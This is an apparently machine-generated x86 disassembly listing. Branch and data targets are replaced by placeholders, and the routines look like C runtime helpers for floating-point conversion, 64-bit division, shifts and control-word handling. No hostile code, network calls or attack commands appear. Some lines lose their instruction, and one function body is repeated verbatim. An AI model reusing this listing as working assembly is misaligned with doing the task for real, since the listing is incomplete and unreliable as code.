mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_100200e0
inc eax
push eax
push edi
push esi
call sub_10027850
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_10033d1c
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_10033dd9
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10033d1c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_10036171
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1002776c
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
sub_10033e70
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10033f50
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_10033f6f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_10036bc3
call sub_10036bc3
mov [ esi ] eax
jmp r-xdata
call sub_10026065
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_10020579
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_10036bc3
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_10033fdb
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1003451f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10034a63
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
